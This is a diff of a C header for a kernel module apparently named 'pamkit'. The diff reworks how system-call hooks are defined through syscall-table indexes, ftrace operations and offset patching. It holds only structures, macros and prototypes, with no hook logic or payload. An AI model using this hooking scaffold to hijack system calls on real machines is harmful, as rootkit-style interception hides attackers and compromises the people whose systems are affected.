@@ -1,66 +1,50 @@
 #ifndef _PAMKIT_HOOKING_H
 #define _PAMKIT_HOOKING_H
 
+#include "approach.h"
+
+#include <linux/kernel.h>
 #include <linux/version.h>
 
-#if defined(PAMKIT_FTRACE_HOOKING) && defined(CONFIG_FTRACE) && defined(CONFIG_DYNAMIC_FTRACE)
+#if defined(PAMKIT_FTRACE_SYSCALL_HOOKING)
 #include <linux/ftrace.h>
 #endif
 
-#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
-#define _arch_syscall_name(name) "__x86_64" name
-#else
-#define _arch_syscall_name(name) name
-#endif
-
-#define HOOK_DATA_EMPTY { .name = NULL, .orig_function = NULL, .hook_function = NULL }
-
-#define HOOK_DATA_DEFINE_SYSCALL(_name, _orig_function, _hook_function)     \
-    {                                                                       \
-        .name = (_name),                                                    \
-        .orig_function = (unsigned long *) (_orig_function),                \
-        .hook_function = (unsigned long *) (_hook_function),                \
+#define SYSCALL_HOOK_DATA_DEFINE(_name, _orig_function, _hook_function, _tbl_index)             \
+    {                                                                                           \
+        .name = (char *) (_name),                                                               \
+        .orig_function_addr = (uintptr_t *) (_orig_function),                                   \
+        .hook_function_addr = (void *) (_hook_function),                                        \
+        .syscall_table_index = (unsigned long) (_tbl_index)                                     \
     }
 
-#define HOOK_DATA_INIT_SYSCALL(_hook_name, _name, _orig_function, _hook_function)   \
-    const hook_data_t _hook_name = HOOK_DATA_DEFINE_SYSCALL(_name, _orig_function, _hook_function)
-
-#define HOOK_DATA_DEFINE_KERNEL_FUNCTION(_name, _orig_function, _hook_function)     \
-    {                                                                               \
-        .name = (_name),                                                            \
-        .orig_function = (unsigned long *) (_orig_function),                        \
-        .hook_function = (unsigned long *) (_hook_function),                        \
-    }
-
-#define HOOK_DATA_INIT_KERNEL_FUNCTION(_hook_name, _name, _orig_function, _hook_function) \
-    const hook_data_t _hook_name = HOOK_DATA_DEFINE_KERNEL_FUNCTION(_name, _orig_function, _hook_function)
+#define SYSCALL_HOOK_DATA_EMPTY SYSCALL_HOOK_DATA_DEFINE(NULL, NULL, NULL, -1)
 
 struct hook_data {
-    char *name; // Name of the original function such that we can e.g. resolve its original address
+    char *name;
 
-    unsigned long *orig_function;
-    unsigned long *hook_function;
+    uintptr_t *orig_function_addr;
+    void *hook_function_addr;
 
-    #if defined(PAMKIT_FTRACE_HOOKING) && defined(CONFIG_FTRACE) && defined(CONFIG_DYNAMIC_FTRACE)
+    unsigned long syscall_table_index;
+
+    #if defined(PAMKIT_SWITCH_PATCHING_SYSCALL_HOOKING)
+    /* Offset that is used to compute the address of the original syscall implementation */
+    int32_t original_offset;
+    /* Memory address where we have to write the 'original_offset' to when restoring the original syscall */
+    void *offset_memory_addr;
+    #endif
+
+    #if defined(PAMKIT_FTRACE_SYSCALL_HOOKING)
+    bool installed;
     struct ftrace_ops fops;
     #endif
 };
 typedef struct hook_data hook_data_t;
 
-int register_system_call_hook(const hook_data_t *syscall_hook);
 
-int register_system_call_hooks(const hook_data_t syscall_hooks[]);
+int register_system_call_hooks(hook_data_t syscall_hooks[]);
 
-void deregister_system_call_hook(const hook_data_t *syscall_hook);
-
-void deregister_system_call_hooks(const hook_data_t syscall_hooks[]);
-
-int register_kernel_function_hook(const hook_data_t *kernel_function_hook);
-
-int register_kernel_function_hooks(const hook_data_t kernel_function_hooks[]);
-
-void deregister_kernel_function_hook(const hook_data_t *kernel_function_hook);
-
-void deregister_kernel_function_hooks(const hook_data_t kernel_function_hooks[]);
+int deregister_system_call_hooks(hook_data_t syscall_hooks[]);
 
 #endif /* _PAMKIT_HOOKING_H */
